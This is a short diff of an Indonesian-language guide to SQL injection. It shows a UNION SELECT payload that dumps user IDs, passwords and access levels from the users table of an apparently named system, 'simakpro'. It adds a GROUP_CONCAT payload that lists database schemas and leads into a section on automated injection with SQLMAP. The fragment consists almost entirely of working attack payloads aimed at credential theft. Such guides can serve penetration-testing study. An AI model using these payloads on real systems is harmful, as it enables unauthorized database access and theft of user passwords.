@@ -31,7 +31,7 @@
 ' UNION SELECT 1,2,3,CONCAT(usrid,' - ',passwd,' - ',level, ' - ', type_user),5,6,7,8,9,10 FROM simakpro.users #
 ```
 
-* Tambahan, Apabila column input tidak bisa menampilkan data secara perulangan maka bisa menggunakan, fungsi: `GROUP_CONCAT(variable_name)`
+* Tambahan, Apabila column input tidak bisa menampilkan data secara perulangan maka bisa menggunakan fungsi: `GROUP_CONCAT(variable_name)`, Cth: ` UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata #`
 
 
 ## Langkah-langkah melakukan SQL Injection secara otomatis menggunakan SQLMAP
